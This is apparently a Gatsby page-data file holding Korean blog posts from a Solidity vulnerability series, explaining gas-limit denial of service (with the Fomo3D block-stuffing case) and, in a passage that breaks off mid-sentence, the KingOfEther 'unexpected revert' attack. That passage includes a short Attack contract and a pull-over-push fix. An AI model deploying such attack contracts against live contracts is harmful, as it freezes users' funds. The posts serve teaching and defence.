{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/vulnerability/dos_with_block_gas_limit/dos_block_gas_limit/",
    "result": {"data":{"cur":{"id":"1ed2f3ad-7dcc-53e2-8502-18c0734dad6f","html":"<h1 id=\"-dosdenial-of-service-with-block-gas-limit\" style=\"position:relative;\"><a href=\"#-dosdenial-of-service-with-block-gas-limit\" aria-label=\" dosdenial of service with block gas limit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 DoS(Denial of Service) With Block Gas Limit</h1>\n<h2 id=\"들어가기전\" style=\"position:relative;\"><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84\" aria-label=\"들어가기전 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>들어가기전</h2>\n<h3 id=\"gas란-무엇인가\" style=\"position:relative;\"><a href=\"#gas%EB%9E%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80\" aria-label=\"gas란 무엇인가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GAS란 무엇인가?</h3>\n<p>이더리움 블록체인의 블록들은 각 블록마다 소비 할 수 있는 가스의 최대량이 정해져있다. 즉 각 블록이 소비할 수 있는 최대량을 넘어선다면 <strong>transaction들은 fail</strong> 하게된다.</p>\n<hr>\n<h3 id=\"dos-with-block-gas-limit\" style=\"position:relative;\"><a href=\"#dos-with-block-gas-limit\" aria-label=\"dos with block gas limit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DoS With Block Gas Limit</h3>\n<p>연산당 Gas가 정해져 있으며 smart contract를 실행할 때 계산된다. Block Gas Limit DOS은 smart contract가 실행되고 Gas를 계산할때 최대 연산량을 초과하면 발생한다.\n예를 들어보겠다.</p>\n<ol>\n<li>한 smart contract에 사용자가 많아짐에 따라 크기가 증가하는 Array가 있다.</li>\n<li>smart contract안에는 그 array 전체를 순환하는 작업이 있다.</li>\n<li>처음에는 괜찮았으나 시간이 지날수록 Array가 커져 연상량이 증가한다.</li>\n<li>연산량이 너무 많아져 Denial Of Service로 이어질 수 있다.</li>\n</ol>\n<p>보다 잘 이해하기 위해 Example Code를 살펴보자!!</p>\n<hr>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example code</h2>\n<p>간단한 code로 이해해보자!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">Payee</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\nPayee<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> payees<span class=\"token punctuation\">;</span>\n<span class=\"token builtin\">uint256</span> nextPayeeIndex<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">pay</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">//pay something</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">payOut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> nextPayeeIndex<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> payees<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&amp;&amp;</span> msg<span class=\"token punctuation\">.</span>gas <span class=\"token operator\">></span> <span class=\"token number\">200000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      payees<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>addr<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>payees<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    nextPayeeIndex <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>이 contract는 Payee들에게 순차적으로 환불해주는 function을 포함하고 있다.\n시나리오는 이렇다.</p>\n<ol>\n<li>pay()를  통해 payees Array에 address와 value를 추가한다.</li>\n<li>점점 payees[]의 크기가 늘어난다.</li>\n<li>payOut()을 실행할때가 되어 실행시킨다.</li>\n<li>payOut()은 payees[] 전체를 순환하며 value를 지급한다.</li>\n<li>payOut()에서 while문을 실행시키다 block gas limit를 초과한다.</li>\n<li>결국 payOut()를 실행 할 수 없어, ETH가 lock된다.</li>\n</ol>\n<hr>\n<h2 id=\"another-exmample\" style=\"position:relative;\"><a href=\"#another-exmample\" aria-label=\"another exmample permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Another Exmample</h2>\n<p>위 Example Code는 smart contract를 만들때 개발자의 실수로 일어날 수 있다.\n하지만 개발자의 실수가 아니더라도 공격자는 높은 가스 가격으로 transaction을 일으킴으로써 transaction이 블록체인에 포함되는 것을 막을 수 있다.</p>\n<p>이 공격은 도박 Dapp인 Fomo3D에서 발생했었다. Fomo3D는 특정 조건에서 키를 발급해주고 마지막으로 Key를 받은 사람에게 보상을 주는 시스템이다. 보상은 타이머가 끝나는 시점에 주어지게되고 Key를 새로 받을 때마다 타이머의 시간이 늘어난다.</p>\n<p>Fomo3D에서는 <strong>Block Stuffing</strong> 을 통해서 ether를 가로챘다. BLock Stuffing을 블록을 채운다는 뜻으로 블록을 채워 Gas Limit을 넘게 만들고 이로인해 transaction이 블록에 기록되지 못하게 하는 것이다.</p>\n<p>시나리오는 이렇다.</p>\n<ol>\n<li>attacker가 특정 조건을 만족시켜 <strong>키를</strong> 발급받는다.</li>\n<li>이후 타이머가 끝날때까지 block stuffing을 통해 다른 transaction을 기록하지 못하게 한다.</li>\n<li>타이머가 끝나는 시간에 보상을 받는다.</li>\n</ol>\n<p>아마 block을 채우는데 많은 돈이 들지만 그만큼 보상이 확실하다면 attack을 받을 여지가 있다.</p>\n<hr>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<p>시간이 지남에 따라 크기가 증가하는 array는 사용에 주의해야한다. 또한 그 array를 순환하는 반복문 작업도 피해야한다.\n또한 꼭 처리해야하는 경우에는 DOS unexpected revert에서 알아보았던 pull over push 방법을 사용해 transaction을 처리해야한다.</p>\n<ul>\n<li>pull over push: contract를 분리함으로써 attacker의 공격을 attacker의 손실로만 처리 할 수 있다. 위의 코드를 pull over push로 바꾸어보았다.</li>\n</ul>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>DOS는 EVM과 큰 관련이 있는 취약점 같다. EVM의 가스체계를 공부함으로써 GAS Optimization등에 대해 깊게 배울 수 있을 것 같다! 취약점 이후에는 EVM에 대한 연구를 해본다면 더 성장할 수 있을 것 같다. 끝!!!</p>\n<hr>\n<h3 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h3>\n<ul>\n<li><a href=\"https://swcregistry.io/docs/SWC-128\">https://swcregistry.io/docs/SWC-128</a></li>\n<li><a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#gas-limit-dos-on-a-contract-via-unbounded-operations\">https://consensys.github.io/smart-contract-best-practices/known_attacks/#gas-limit-dos-on-a-contract-via-unbounded-operations</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84\">들어가기전</a></p>\n<ul>\n<li><a href=\"#gas%EB%9E%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80\">GAS란 무엇인가?</a></li>\n<li><a href=\"#dos-with-block-gas-limit\">DoS With Block Gas Limit</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#example-code\">Example code</a></p>\n</li>\n<li>\n<p><a href=\"#another-exmample\">Another Exmample</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n<ul>\n<li><a href=\"#reference\">Reference</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"👋 DoS(Denial of Service) With Block Gas Limit 들어가기전 GAS란 무엇인가? 이더리움 블록체인의 블록들은 각 블록마다 소비 할 수 있는 가스의 최대량이 정해져있다. 즉 각 블록이 소비할 수 있는 최대량을 넘어선다면 transaction들은 fail 하게된다. DoS With Block Gas Limit 연산당 Gas가 정해져 있으며 smart contract를 실행할 때 계산된다. Block Gas Limit DOS은 smart contract가 실행되고 Gas를 계산할때 최대 연산량을 초과하면 발생한다.\n예를 들어보겠다. 한 smart contract에 사용자가 많아짐에 따라 크기가 증가하는 Array가 있다. smart contract안에는 그 array 전체를 순환하는 작업이 있다. 처음에는 괜찮았으나 시간이 지날수록 Array가 커져 연상량이 증가한다. 연산량이 너무 많아져 Denial Of Service로 이어질 수 있다. 보다 잘 이해…","frontmatter":{"date":"December 31, 2021","title":"(취약점 시리즈 7) DOS With Block Gas Limit","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/vulnerability/dos_with_block_gas_limit/dos_block_gas_limit/"}},"next":{"id":"be3c0ee9-047a-5710-97f4-2b9135ecc85a","html":"<h1 id=\"-unexpected-revert\" style=\"position:relative;\"><a href=\"#-unexpected-revert\" aria-label=\" unexpected revert permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Unexpected Revert</h1>\n<h2 id=\"unexpected-revert란\" style=\"position:relative;\"><a href=\"#unexpected-revert%EB%9E%80\" aria-label=\"unexpected revert란 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unexpected Revert란?</h2>\n<p>Unexpected Revert는 이름에서 알 수 있듯이, 트랜잭션을 고의적 revert시킴으로써 스마트 계약이 작동되지 않는 상태로 만드는 취약성입니다.</p>\n<hr>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example code</h2>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">KingOfEther</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> king<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> balance<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">claimThrone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">></span> balance<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Need to pay more to become the king\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> king<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> balance<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        balance <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        king <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\n    KingOfEther kingOfEther<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>KingOfEther _kingOfEther<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        kingOfEther <span class=\"token operator\">=</span> <span class=\"token function\">KingOfEther</span><span class=\"token punctuation\">(</span>_kingOfEther<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        kingOfEther<span class=\"token punctuation\">.</span>claimThrone<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<p><span style=\"color:grey\">출처: <a href=\"https://solidity-by-example.org/hacks/denial-of-service/\">https://solidity-by-example.org/hacks/denial-of-service/</a></span></p>\n<p>시나리오는 이렇다.</p>\n<ol>\n<li>KingOfEther of Ether Contract가 배포된다.</li>\n<li>처음으로 A가 1 Ether를 claimThrone()에 보냄으로써 King이 된다.</li>\n<li>다음으로 B가 2 Ether를 claimThrone()에 보냄으로써 B가 King으로 바뀐다. King이 바뀌기 전에 A에게 1 Ether를 refund 해준다.</li>\n<li>C가 KingOfEther의 주소와 함께 Attack contract를 배포한다.</li>\n<li>C는 Attack.attack을 3 Ether와 함꼐 호출한다.</li>\n<li>C는 C는 king이 되고 Attack contract는 ether를 받을 수 없기 때문에 다른 누구도 king이 될 수 없게 된다. 즉 KingOfEhter은 무의미한 contract가 된다.</li>\n</ol>\n<p>EVM이 externally owned accounts와 contract accounts를 구분하지 않는다는 점을 악용한 것 같아보인다.</p>\n<hr>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<h4 id=\"pull-over-push\" style=\"position:relative;\"><a href=\"#pull-over-push\" aria-label=\"pull over push permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>pull over push</strong></h4>\n<p>pull over push를 통해 문제를 해결 할 수 있다. pull over push는 contract를 분리함으로써 attacker의 공격을 attacker의 손실로만 처리 할 수 있다. 위의 코드를 pull over push로 바꾸어보았다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">KingOfEther</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> king<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> balance<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">claimThrone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">></span> balance<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Need to pay more to become the king\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        balances<span class=\"token punctuation\">[</span>king<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> balance<span class=\"token punctuation\">;</span>\n\n        balance <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        king <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">!=</span> king<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Current king cannot withdraw\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint</span> amount <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n이 코드는 Example 코드의 <span class=\"token function\">claimThrone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">function</span>이 <span class=\"token number\">2</span>개의 <span class=\"token keyword\">function</span>으로 나누어 진 것을 볼 수 있다<span class=\"token punctuation\">.</span> 위 코드의 <span class=\"token function\">claimThrone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>는 king을 바꾸는 용도로만 사용된다<span class=\"token punctuation\">.</span> 그리고 king에서 쫒겨난 사람들은 withdraw 함수를 통해 ether를 다시 